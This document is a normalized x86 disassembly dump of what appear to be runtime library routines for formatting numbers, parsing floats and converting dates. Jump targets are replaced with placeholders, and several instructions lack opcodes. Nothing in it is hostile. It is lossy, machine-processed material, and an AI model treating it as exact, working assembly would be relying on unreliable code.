add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408963
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_4086ee
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408736
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_4086ee
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408600
pop edx
or edx edx
je r-xdata
sub_4086ee
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408963
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408736
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408963
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408584
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_40875d ]
mov ebx ecx
sub cl 0x44
je sub_407d74
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041b8
jmp r-xdata
mov esi sub_404218
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407d74
sub cl 0x44
je sub_407d08
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407d08
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d74
mov ecx 0x10
cmp bl 0x58
je sub_407d08
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4085dc
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408b1c
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407d08
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408984
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40833c
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40860c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4089c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40833c
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40860c
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408a18
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404250
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404250
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_40860c
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404080
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f90
mov eax esi
mov edx ebx
call sub_4045dc
mov eax [ ebp - 0x4 ]
call sub_404250
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_40860c
mov edx esi
xchg edx eax
call sub_4045dc
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408ad8
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408b1c
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408df0
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408c1b
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408c25
call sub_408c1b
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ad8
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408c81
call sub_408c1b
call sub_408c12
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408c12
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ad8
retn
xor ecx ecx
sub_408cbd
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408c12
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408c12
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408d22
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408d76
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408cbd
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408df0
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408e1d
jmp r-xdata
call sub_408f3f
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408e1d
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_408f3f
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_40901c
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4090d3
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4090de
neg edx
mov ecx esi
call sub_4090de
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4090d3
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4090fa
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4090de
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4090fa
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409130
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408b1c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404080
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409160
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408b1c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404080
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4091ac
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404450
mov edx esp
xor ecx ecx
call sub_40901c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4091d8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404450
mov edx esp
xor ecx ecx
call sub_40901c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409220
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409264
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4092d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409220
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_4079a8
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_4079a8
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_4079a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409330
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40936c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409330
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409434
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409220
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_4079a8
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_4079a8
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_4079a8
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409330
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409580
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409434
pop esi
pop ecx
pop ebp
retn 0x8
sub_4095a0
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409220
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4095dc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_409620
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404250
mov edx eax
mov eax ebx
call sub_4095dc
pop ecx
pop ebx
pop ebp
retn
sub_409640
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40860c
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4095dc
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40968c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_4096b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
